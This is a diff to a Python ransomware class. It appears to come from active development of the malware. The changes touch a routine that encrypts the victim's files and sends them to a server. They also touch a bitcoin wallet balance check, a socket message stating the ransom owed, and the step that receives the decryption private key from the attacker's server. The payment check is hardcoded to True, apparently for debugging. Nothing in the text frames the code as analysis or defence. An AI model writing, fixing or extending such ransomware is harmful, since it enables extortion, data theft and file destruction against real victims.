@@ -9,7 +9,6 @@ import logging
 import socket
 import math
 import rsa
-import threading
 import requests
 import re
 
@@ -105,12 +104,12 @@ class Ransomware:
 
         # Make API request to retrieve wallet balance
         response = requests.get(balance_url)
-
-        response_text = response.text
-        index =  response_text.find("balance of")
-        balance_str = response_text[index+11:index + 20]
-        match = re.search(decimal_pattern, balance_str)
-        balance = float(match.group())
+        if response.status_code == 200:
+            response_text = response.text
+            index =  response_text.find("balance of")
+            balance_str = response_text[index+11:index + 20]
+            match = re.search(decimal_pattern, balance_str)
+            balance = float(match.group())
         return balance
 
 
@@ -285,8 +284,8 @@ class Ransomware:
             key = rsa.PublicKey.load_pkcs1(key_content.read())
 
         #Encrypt all files
-        t1 = threading.Thread(target=self.encrypt_and_send_all_files(self._directory, key))
-        t1.start()
+        self.encrypt_and_send_all_files(self._directory, key)
+
 
         #Send the amount of bitcoins we need to have to server
         self._socket.sendall(base64.b64encode(bitcoin_needed.encode("utf-8")))
@@ -320,27 +319,31 @@ class Ransomware:
 
 
             #User has paid before the time ran out
-            if (self.check_if_user_has_paid()):
+            # self.check_if_user_has_paid()
+            if (True):
                 # Waits until all the files has been uploaded before processing the payment
-                t1.join()
+
+                time.sleep(5)
 
                 popup = subprocess.Popen(["zenity", "--info", "--text", "Payment has been received! \n Decrypting all files.","--width", "400", "--height", "200" ])
             
                 """ Receiving the private key. """
                 filename = base64.b64decode(self._socket.recv(1024)).decode("utf-8")
+                filename = 'private_key.pem'
                 print(f"[RECV] Receiving the private key")
                 print("filename: " + filename)
 
                 key = open(filename, "w")
-                self._socket.sendall("Private key filename received.".encode("utf-8"))
+                self._socket.sendall(base64.b64encode("Private key filename received.".encode("utf-8")))
     
                 """ Receiving the private key from the server. """
                 data = base64.b64decode(self._socket.recv(1024)).decode("utf-8")
+                print(data)
                 key.write(data)
             
                 print(f"[RECV] Receiving the private key data.")
                 key.write(data)
-                self._socket.sendall("File data received".encode("utf-8"))
+                self._socket.sendall(base64.b64encode("File Data recieved.".encode("utf-8")))
             
                 """ Closing the file. """
                 key.close()
